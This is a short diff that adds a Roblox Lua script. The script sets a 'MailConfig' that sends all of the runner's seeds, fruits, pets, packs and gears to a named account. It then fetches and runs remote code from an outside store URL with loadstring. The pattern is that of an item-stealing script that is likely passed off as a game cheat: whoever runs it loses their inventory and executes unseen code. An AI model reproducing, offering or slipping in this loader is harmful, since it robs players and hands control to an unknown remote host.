@@ -1,0 +1,10 @@
+getgenv().HB_MailConfig = {
+        MainUsername = "Ziczac_052",  -- 
+        SendSeeds    = true,
+        SendAllSeeds = true,   -- true = ()
+       SendFruits   = true,   
+        SendPets     = true,  
+        SendPacks    = true,   
+        SendGears    = true,   
+    }
+loadstring(game:HttpGet("https://hybrid-e3.store/api/scripts/4a9b943789624a36a3eae49c53f11d60/loader"))()
